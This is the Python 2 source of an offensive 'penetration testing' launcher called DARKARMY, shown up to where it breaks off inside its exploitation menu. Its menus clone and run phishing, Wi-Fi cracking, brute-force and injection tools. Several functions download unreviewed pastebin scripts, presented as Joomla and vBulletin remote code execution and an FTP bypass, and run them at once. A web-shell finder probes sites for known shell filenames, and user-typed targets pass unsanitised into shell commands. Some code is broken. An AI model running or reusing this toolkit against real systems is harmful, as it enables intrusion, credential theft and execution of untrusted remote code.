#!/usr/bin/env python2.7
#
#  
#  
#       ______  ___  ______ _   __  ___  _________  ____   __
#       |  _  \/ _ \ | ___ \ | / / / _ \ | ___ \  \/  \ \ / /
#       | | | / /_\ \| |_/ / |/ / / /_\ \| |_/ / .  . |\ V / 
#       | | | |  _  ||    /|    \ |  _  ||    /| |\/| | \ /  
#       | |/ /| | | || |\ \| |\  \| | | || |\ \| |  | | | |  
#       |___/ \_| |_/\_| \_\_| \_/\_| |_/\_| \_\_|  |_/ \_/  
#                                       ~@~ coded by 1ucif3r ~@~

import sys
import argparse
import os
import time
import httplib
import subprocess
import re
import urllib2
import socket
import urllib
import sys
import json
import telnetlib
import glob
import random
import Queue
import threading
#import requests
import base64
from getpass import getpass
from commands import *
from sys import argv
from platform import system
from urlparse import urlparse
from xml.dom import minidom
from optparse import OptionParser
from time import sleep
##########################
os.system('clear')


class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'

def menu():
    print ("""
MIT License

Copyright (c) 2023 DARKARMY

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.""")


os.system('clear')
os.system('clear')
os.system('clear')
os.system('clear')

directories = ['/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/', '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/', '/Resume/', '/UsersFiles/', '/Usersiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
               '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/', '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/', '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/', '/AlumniPhotos/', '/users/']
shells = ['wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php', 'cp.php', 'upload.php',
          'sh.php', 'pk.php', 'mad.php', 'x00x.php', 'worm.php', '1337worm.php', 'config.php', 'x.php', 'haha.php']
upload = []
yes = set(['yes', 'y', 'ye', 'Y'])
no = set(['no', 'n'])




color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]
random.shuffle(color_random)
darkarmylogo = color_random[0] + '''
    ______  ___  ______ _   __  ___  _________  ____   __ 
    |  _  \/ _ \ | ___ \ | / / / _ \ | ___ \  \/  \ \ / / 
    | | | / /_\ \| |_/ / |/ / / /_\ \| |_/ / .  . |\ V /  
    | | | |  _  ||    /|    \ |  _  ||    /| |\/| | \ /   
    | |/ /| | | || |\ \| |\  \| | | || |\ \| |  | | | |   
    |___/ \_| |_/\_| \_\_| \_/\_| |_/\_| \_\_|  |_/ \_/ 
    
                        A Penetration Testing Framework  
                                                                                                                                                                                                                   
'''
def menu():
    print (darkarmylogo + """\033[1m
   [!] Coded By 1ucif3r [!] https://dark4rmy.in [!]
\033[0m
   {1}--Information Gathering
   {2}--Password Attacks
   {3}--Wireless Testing
   {4}--Exploitation Tools
   {5}--Social Engineering
   {6}--Web Hacking
   {7}--DDOS Tools
   {8}--Remote Administrator Tools (RAT)
   {9}--Bug Bounty Tools
   {10}-DarkArmy Tools
   {11}-1ucif3r's Tools
   {0}--Update The DARKARMY 
   {99}-Exit
 """)
    choice = raw_input("Dark4rmy >> ")
    os.system('clear')
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        social()
    elif choice == "6":
        webhack()
    elif choice == "7":
        ddos()
    elif choice == "8":
        rat()
    elif choice == "9":
        bugbounty()
    elif choice == "10":
        dtools()
    elif choice == "11":
        lucifer()
    elif choice == "0":
        updatedarkarmy()
    elif choice == "99":
        clearScr(), sys.exit()
    elif choice == "":
        menu()
    else:
        menu()
        
        
def ddos():
    print('''\033[91m
                      
    .dP"Y8  dP"Yb   dP"Yb  88b 88 
    `Ybo." dP   Yb dP   Yb 88Yb88 
    o.`Y8b Yb   dP Yb   dP 88 Y88 
    8bodP'  YbodP   YbodP  88  Y8 
 
    [!] I WILL ADD THIS TOOLS IN NEXT UPDATE [!]
         
 \033[0m''')
    print("  {99}-Back To Main Menu \n\n")
    choice2 = raw_input("DDOS >> ")

    if choice2 == "99":
        clearScr()
        menu()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
        
        
def rat():
    print('''\033[91m
                      
    .dP"Y8  dP"Yb   dP"Yb  88b 88 
    `Ybo." dP   Yb dP   Yb 88Yb88 
    o.`Y8b Yb   dP Yb   dP 88 Y88 
    8bodP'  YbodP   YbodP  88  Y8 
 
    [!] I WILL ADD THIS TOOLS IN NEXT UPDATE [!]
         
 \033[0m''')
    print("  {99}-Back To Main Menu \n\n")
    choice2 = raw_input("RAT >> ")

    if choice2 == "99":
        clearScr()
        menu()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
    

def bugbounty():
    print('''\033[91m
                      
    .dP"Y8  dP"Yb   dP"Yb  88b 88 
    `Ybo." dP   Yb dP   Yb 88Yb88 
    o.`Y8b Yb   dP Yb   dP 88 Y88 
    8bodP'  YbodP   YbodP  88  Y8 
 
    [!] I WILL ADD THIS TOOLS IN NEXT UPDATE [!]
         
 \033[0m''')
    print("  {99}-Back To Main Menu \n\n")
    choice2 = raw_input("BugBounty >> ")

    if choice2 == "99":
        clearScr()
        menu()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
        
        
def lucifer():
    print('''\033[91m
                          
      .d 88   88  dP""b8 88 888888 88888 88""Yb 
    .d88 88   88 dP   `" 88 88__     .dP 88__dP 
      88 Y8   8P Yb      88 88""   o `Yb 88"Yb  
      88 `YbodP'  YboodP 88 88     YbodP 88  Yb 
      
       [!] Some of my Tools [!]
         
 \033[0m''')
    print("   {1}--AirCrackAuto(Wifi Hacking)")
    print("   {2}--Obfuscator")
    print("   {3}--SQLiScanner (SOON)")
    print("   {4}--Crypter (SOON) \n")
    print("   {99}-Return to main menu \n\n ")
    choice11 = raw_input("1ucif3r >> ")
    os.system('clear')
    if choice11 == "1":
        clearScr()
        aircrack()
    if choice11 == "2":
        clearScr()
        obf()
    if choice11 == "3":
        clearScr()
        sqliscanner()
    if choice11 == "4":
        clearScr()
        crypter()
    elif choice11 == "99":
        clearScr()
        menu()    
    elif choice11 == "":
        clearScr()
        menu()
    else:
        clearScr()
        
def aircrack():
    print ("A Automate script for WiFi hacking . You Need a Wifi Adaptor For this . ")
    choiceupdate = raw_input("Continue Y / N: ")
    if choiceupdate in yes:
        os.system("git clone https://github.com/1ucif3r/aircrackauto.git")
        os.system("cd aircrackauto && bash install.sh")
        os.system("aircrackauto")
        clearScr()
        lucifer()
        
def obf():
    os.system("git clone https://github.com/1ucif3r/Obfuscator.git")
    os.system("cd Obfuscator && python3 obfuscator.py")
    clearScr()
    lucifer()
    
def sqliscanner():
    clearScr()
    lucifer()
    
def crypter():
    clearScr()
    lucifer()


def updatedarkarmy():
    print ("This Tool is Only Available for Linux and Similar Systems. ")
    choiceupdate = raw_input("Continue Y / N: ")
    if choiceupdate in yes:
        os.system("git clone https://github.com/D4RK-4RMY/DARKARMY.git")
        os.system("cd DARKARMY && sudo bash ./update.sh")
        os.system("darkarmy")


def doork():
    print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
    doorkchice = raw_input("Continue Y / N: ")
    if doorkchice in yes:
        os.system("pip install beautifulsoup4 && pip install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        clearScr()
        doorkt = raw_input("Target : ")
        os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)


def dtools():
    print('''\033[91m
                               
8888b.     db    88""Yb 88  dP    db    88""Yb 8b    d8 Yb  dP 
 8I  Yb   dPYb   88__dP 88odP    dPYb   88__dP 88b  d88  YbdP  
 8I  dY  dP__Yb  88"Yb  88"Yb   dP__Yb  88"Yb  88YbdP88   8P   
8888Y"  dP""""Yb 88  Yb 88  Yb dP""""Yb 88  Yb 88 YY 88  dP    

       [!] Some Tools By Dark4rmy Team [!]
         
 \033[0m''')
    print("   {1}--DarkScan ")
    print("   {2}--DarkTor (Need Update)")
    print("   {99}-Back To The Main Menu \n\n")
    choice4 = raw_input("Dark4rmy >> ")
    if choice4 == "1":
        clearScr()
        dscan()
    if choice4 == "2":
        clearScr()
        dtor()
    elif choice4 == "99":
        clearScr()
        menu()
    elif choice4 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()
    
def dscan():
    os.system("git clone https://github.com/D4RK-4RMY/Darkscan.git")
    os.system("cd Darkscan && python3 darkscan.py")
    clearScr()
    dtools()
    
def dtor():
    clearScr()
    dtools()
    


def scanusers():
    site = raw_input('Enter a website : ')
    try:
        users = site
        if 'http://www.' in users:
            users = users.replace('http://www.', '')
        if 'http://' in users:
            users = users.replace('http://', '')
        if '.' in users:
            users = users.replace('.', '')
        if '-' in users:
            users = users.replace('-', '')
        if '/' in users:
            users = users.replace('/', '')
        while len(users) > 2:
            print users
            resp = urllib2.urlopen(
                site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()

            if 'invalid username' not in resp.lower():
                print "\tFound -> %s" % users
                pass

            users = users[:-1]
    except:
        pass


def brutex():
    clearScr()
    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
    os.system("git clone https://github.com/1N3/BruteX.git")
    clearScr()
    brutexchoice = raw_input("Select a Target : ")
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)


def arachni():
    print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
    cara = raw_input("Install And Run ? Y / N : ")
    clearScr()
    print("exemple : http://www.target.com/")
    tara = raw_input("Select a target to scan : ")
    if cara in yes:        
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system(
            "cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("archani")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s" % tara)


def XSStrike():
    clearScr()
    print("XSStrike is a python script designed to detect and exploit XSS vulnerabilites. Follow The Owner On Github @UltimateHackers")
    os.system("sudo rm -rf XSStrike")
    os.system("git clone https://github.com/UltimateHackers/XSStrike.git && cd XSStrike && pip install -r requirements.txt && clear && python xsstrike")


def crips():
    clearScr()
    os.system("git clone https://github.com/Manisso/Crips.git")
    os.system("cd Crips && sudo bash ./update.sh")
    os.system("crips")
    os.system("clear")


def weeman():
    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
    choicewee = raw_input("Install Weeman ? Y / N : ")
    if choicewee in yes:
        os.system(
            "git clone https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
    if choicewee in no:
        menu()
    else:
        menu()


def gabriel():
    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass = raw_input("Enter Target IP and Use Command :")
    os.system("python gabriel.py %s" % ftpbypass)


def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")


def h2ip():
    host = raw_input("Select A Host : ")
    ips = socket.gethostbyname(host)
    print(ips)


def ports():
    clearScr()
    target = raw_input('Select a Target IP : ')
    os.system("nmap -O -Pn %s" % target)
    sys.exit()


def ifinurl():
    print""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found."""
    print('Do You Want To Install InurlBR ? ')
    cinurl = raw_input("Y/N: ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
    elif cinurl == "":
        menu()
    else:
        menu()


def bsqlbf():
    clearScr()
    print("This tool will only work on blind sql injection")
    cbsq = raw_input("select target : ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s" % cbsq)
    os.system("rm bsqlbf.pl")


def atscan():
    print ("Do You To Install ATSCAN ?")
    choiceshell = raw_input("Y/N: ")
    if choiceshell in yes:
        os.system("sudo rm -rf ATSCAN")
        os.system(
            "git clone https://github.com/AlisamTechnology/ATSCAN.git && cd ATSCAN && perl atscan.pl")
    elif choiceshell in no:
        os.system('clear')
        menu()


def commix():
    print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
    print ("usage : python commix.py --help")
    choicecmx = raw_input("Continue: y/n :")
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix")
        os.system("python commix.py")
        os.system("")
    elif choicecmx in no:
        os.system('clear')
        info()


def pixiewps():
    print"""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
    """
    choicewps = raw_input("Continue ? Y/N : ")
    if choicewps in yes:
        os.system("git clone https://github.com/wiire/pixiewps.git")
        os.system("cd pixiewps & make ")
        os.system("sudo make install")
    if choicewps in no:
        menu()
    elif choicewps == "":
        menu()
    else:
        menu()


def webhack():
    print('''\033[91m
          
    Yb        dP 888888 88""Yb
     Yb  db  dP  88__   88__dP
      YbdPYbdP   88""   88""Yb
       YP  YP    888888 88oodP
    
     [!] Web Hacking Tools [!]
         
 \033[0m''')
    print("   {1}--Drupal Hacking ")
    print("   {2}--Inurlbr")
    print("   {3}--Wordpress & Joomla Scanner")
    print("   {4}--Gravity Form Scanner")
    print("   {5}--File Upload Checker")
    print("   {6}--Wordpress Exploit Scanner")
    print("   {7}--Wordpress Plugins Scanner")
    print("   {8}--Shell and Directory Finder")
    print("   {9}--Joomla! 1.5 - 3.4.5 remote code execution")
    print("   {10}-Vbulletin 5.X remote code execution")
    print(
        "   {11}-BruteX - Automatically brute force all services running on a target")
    print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
    print("   {99}-Back To Main Menu \n")
    choiceweb = raw_input("Web >> ")
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
        clearScr()
        ifinurl()
    if choiceweb == '3':
        clearScr()
        wppjmla()
    if choiceweb == "4":
        clearScr()
        gravity()
    if choiceweb == "5":
        clearScr()
        sqlscan()
    if choiceweb == "6":
        clearScr()
        wpminiscanner()
    if choiceweb == "7":
        clearScr()
        wppluginscan()
    if choiceweb == "8":
        clearScr()
        shelltarget()
    if choiceweb == "9":
        clearScr()
        joomlarce()
    if choiceweb == "10":
        clearScr()
        vbulletinrce()
    if choiceweb == "11":
        clearScr()
        brutex()
    if choiceweb == "12":
        clearScr()
        arachni()
    elif choiceweb == "99":
        clearScr()
        menu()
    elif choiceweb == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget = raw_input("Select a targets list :")
    os.system("python temp.py %s" % jmtarget)


def inurl():
    dork = raw_input("select a Dork:")
    output = raw_input("select a file to save :")
    os.system(
        "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
    else:
        menu()


def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()


def nmap():

    choice7 = raw_input("continue ? Y / N : ")
    if choice7 in yes:
        os.system("git clone https://github.com/nmap/nmap.git")
        os.system("cd nmap && ./configure && make && make install")
    elif choice7 in no:
        info()
    elif choice7 == "":
        menu()
    else:
        menu()


def jboss():
    os.system('clear')
    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
    print ("deployed, the script uses its upload and command execution capability to")
    print ("provide an interactive session.")
    print ("")
    print ("usage : ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    choice9 = raw_input("yes / no :")
    if choice9 in yes:
        os.system(
            "git clone https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
    elif choice9 in no:
        os.system('clear')
        exp()
    elif choice9 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def wppluginscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = raw_input("sites file : ")
    filepath = raw_input("Plugins File : ")

    def scan(site, dir):
        global resp
        try:
            conn = httplib.HTTPConnection(site)
            conn.request('HEAD', "/wp-content/plugins/" + dir)
            resp = conn.getresponse().status
        except(), message:
            print "Cant Connect :", message
            pass

    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site, plugin)
            if resp not in Notfound:
                print "+----------------------------------------+"
                print "| current site :" + site
                print "| Found Plugin : " + plugin
                print "| Result:", resp


def sqlmap():
    print ("usage : python sqlmap.py -h")
    choice8 = raw_input("Continue: y/n :")
    if choice8 in yes:
        os.system(
            "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        os.system('clear')
        info()
    elif choice8 == "":
        menu()
    else:
        menu()


def grabuploadedlink(url):
    try:
        for dir in directories:
            currentcode = urllib.urlopen(url + dir).getcode()
            if currentcode == 200 or currentcode == 403:
                print "-------------------------"
                print "  [ + ] Found Directory :  " + str(url + dir) + " [ + ]"
                print "-------------------------"
                upload.append(url + dir)
    except:
        pass


def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                currentcode = urllib.urlopen(upl + shell).getcode()
                if currentcode == 200:
                    print "-------------------------"
                    print "  [ ! ] Found Shell :  " + str(upl + shell) + " [ ! ]"
                    print "-------------------------"
    except:
        pass


def shelltarget():
    print("exemple : http://target.com")
    line = raw_input("target : ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)


def poet():
    print("POET is a simple POst-Exploitation Tool.")
    print("")
    choicepoet = raw_input("y / n :")
    if choicepoet in yes:
        os.system("git clone https://github.com/mossberg/poet.git")
        os.system("python poet/server.py")
    if choicepoet in no:
        clearScr()
        postexp()
    elif choicepoet == "":
        menu()
    else:
        menu()


def setoolkit():
    print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
    print(") designed for social engineering. SET has a number of custom attack vectors that ")
    print(" allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC  ")
    print("an information security consulting firm located in Cleveland, Ohio.")
    print("")

    choiceset = raw_input("y / n :")
    if choiceset in yes:
        os.system(
            "git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        clearScr()
        info()
    elif choiceset == "":
        menu()
    else:
        menu()

def cupp():
    print("cupp is a password list generator ")
    print("Usage: python cupp.py -h")
    choicecupp = raw_input("Continue: y/n : ")

    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("file downloaded successfully")
    elif choicecupp in no:
        clearScr()
        passwd()
    elif choicecupp == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def ncrack():
    print("A Ruby interface to Ncrack, Network authentication cracking tool.")
    print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Continue: y/n")
    choicencrack = raw_input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        clearScr()
        passwd()
    elif choicencrack == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def reaver():
    print """
      Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup
      WPS registrar PINs in order to recover WPA/WPA2 passphrases. It has been tested against a
      wide variety of access points and WPS implementations
      1 to accept / 0 to decline
        """
    creaver = raw_input("y / n :")
    if creaver in yes:
        os.system(
            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        clearScr()
        wire()
    elif creaver == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def ssls():
    print"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
    attacks.
    It requires Python 2.5 or newer, along with the 'twisted' python module."""
    cssl = raw_input("y / n :")
    if cssl in yes:
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    if cssl in no:
        snif()
    elif cssl == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):

    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_gravityforms(sites):
    import urllib
    gravityforms = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403:
                gravityforms.append(site)
        except:
            pass

    return gravityforms


def gravity():
    ip = raw_input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms:
        print ss

    print '\n'
    print '[*] Found, ', len(gravityforms), ' gravityforms.'


def shellnoob():
    print """Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!"""
    cshell = raw_input("Y / N : ")
    if cshell in yes:
        os.system("git clone https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("sudo python shellnoob.py --install")
    if cshell in no:
        exp()
    elif cshell == "":
        menu()
    else:
        menu()


def info():

    print('''\033[91m
          
    88 88b 88 888888  dP"Yb
    88 88Yb88 88__   dP   Yb
    88 88 Y88 88""   Yb   dP
    88 88  Y8 88      YbodP
    
[!] Information Gathering Tools [!]
         
 \033[0m''')
    print("  {1}--Nmap ")
    print("  {2}--Setoolkit")
    print("  {3}--Port Scanning")
    print("  {4}--Host To IP")
    print("  {5}--wordpress user")
    print("  {6}--CMS scanner")
    print("  {7}--XSStrike")
    print("  {8}--Dork - Google Dorks Passive Vulnerability Auditor ")
    print("  {9}--Scan A server's Users  ")
    print("  {10}-Crips\n  ")
    print("  {99}-Back To Main Menu \n\n")
    choice2 = raw_input("InformationG. >> ")
    if choice2 == "1":
        os.system('clear')
        nmap()
    if choice2 == "2":
        clearScr()
        setoolkit()
    if choice2 == "3":
        clearScr()
        ports()
    if choice2 == "4":
        clearScr()
        h2ip()
    if choice2 == "5":
        clearScr()
        wpue()
    if choice2 == "6":
        clearScr()
        cmsscan()
    if choice2 == "7":
        clearScr()
        XSStrike()
    if choice2 == "8":
        clearScr()
        doork()
    if choice2 == "10":
        clearScr()
        crips()
    elif choice2 == "99":
        clearScr()
        menu()
    if choice2 == "9":
        clearScr()
        scanusers()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()
        
        



def cmsscan():
    os.system("git clone https://github.com/Dionach/CMSmap.git")
    clearScr()
    xz = raw_input("select target : ")
    os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)


def wpue():
    os.system("git clone https://github.com/wpscanteam/wpscan.git")
    clearScr()
    xe = raw_input("Select a Wordpress target : ")
    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)


def priv8():
    dzz()


def androidhash():
    key = raw_input("Enter the android hash : ")
    salt = raw_input("Enter the android salt : ")
    os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
    os.system(
        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))


def passwd():
    print('''\033[91m
                               
    88""Yb    db    .dP"Y8 .dP"Y8 Yb        dP 8888b.
    88__dP   dPYb   `Ybo." `Ybo."  Yb  db  dP   8I  Yb
    88"""   dP__Yb  o.`Y8b o.`Y8b   YbdPYbdP    8I  dY
    88     dP""""Yb 8bodP' 8bodP'    YP  YP    8888Y"   

    [!] Password Attack Tools [!]
         
 \033[0m''')
    print("   {1}--Cupp ")
    print("   {2}--Ncrack \n ")

    print("   {99}-Back To Main Menu \n")
    choice3 = raw_input("Passwd >> ")
    if choice3 == "1":
        clearScr()
        cupp()
    elif choice3 == "2":
        clearScr()
        ncrack()
    elif choice3 == "99":
        clearScr()
        menu()
    elif choice3 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()
		
def bluepot():
    print("you need to have at least 1 bluetooh receiver (if you have many it will work wiht those, too). You must install / libbluetooth-dev on Ubuntu / bluez-libs-devel on Fedora/bluez-devel on openSUSE ")
    choice = raw_input("Continue ? Y / N : ")
    if choice in yes:
        os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
    else:
        menu()
	
def fluxion():
    print("fluxion is a wifi key cracker using evil twin attack..you need a wireless adoptor for this tool.")
    choice = raw_input("Continue ? Y / N : ")
    if choice in yes:
        os.system("git clone https://github.com/thehackingsage/Fluxion.git") 
	os.system("cd Fluxion && cd install && sudo chmod +x install.sh && sudo ./install.sh")
	os.system("cd .. && sudo chmod +x fluxion.sh && sudo ./fluxion.sh")
    elif choice in no:
	clearScr()
	wire()
    else:
        menu()
	
def wire():
    print('''\033[91m
          
    Yb        dP 88 88""Yb 888888 88     888888 .dP"Y8 .dP"Y8
     Yb  db  dP  88 88__dP 88__   88     88__   `Ybo." `Ybo."
      YbdPYbdP   88 88"Yb  88""   88  .o 88""   o.`Y8b o.`Y8b
       YP  YP    88 88  Yb 888888 88ood8 888888 8bodP' 8bodP'
    
      [!] Wireless Testing Tools [!]
         
 \033[0m''')
    print("   {1}--reaver ")
    print("   {2}--pixiewps")
    print("   {3}--Bluetooth Honeypot GUI Framework")
    print("   {4}--Fluxion\n")
    print("   {99}-Back To The Main Menu \n\n")
    choice4 = raw_input("Wireless >> ")
    if choice4 == "1":
        clearScr()
        reaver()
    if choice4 == "2":
        clearScr()
        pixiewps()
    if choice4 == "3":
        clearScr()
        bluepot()
    if choice4 == "4":
        clearScr()
        fluxion()
    
    elif choice4 == "99":
        clearScr()
        menu()
    elif choice4 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def exp():
    print('''\033[91m
              
    888888 Yb  dP 88""Yb 88      dP"Yb  88 888888 
    88__    YbdP  88__dP 88     dP   Yb 88   88   
    88""    dPYb  88"""  88  .o Yb   dP 88   88   
    888888 dP  Yb 88     88ood8  YbodP  88   88   

    [!] Exploitation Tools [!]
         
 \033[0m''')
    print("   {1}--ATSCAN")
    print("   {2}--sqlmap")
    print("   {3}--Shellnoob")
    print("   {4}--commix")
    print("   {5}--FTP Auto Bypass")
    print("   {6}--jboss-autopwn")
    print("   {7}--Blind SQL Automatic Injection And Exploit")
    print("   {8}--Bruteforce the Android Passcode given the hash and salt")
    print("   {9}--Joomla SQL injection Scanner \n ")
    print("   {99}-Go Back To Main Menu \n\n")
    choice5 = raw_input("Exploitation >> ")
    if choice5 == "2":
        clearScr()
        sqlmap()
    if choice5 == "1":
        os.system('clear')
        atscan()
    if choice5 == "3":
        clearScr()
        shellnoob()
    if choice5 == "4":
        os.system("clear")
        commix()
    if choice5 == "5":
        clearScr()
        gabriel()
    if choice5 == "6":
        clearScr()
        jboss()
    if choice5 == "7":
        clearScr()
        bsqlbf()
    if choice5 == "8":
        clearScr()
        androidhash()
    if choice5 == "9":
        clearScr()
        cmsfew()
    elif choice5 == "99":
        clearScr()
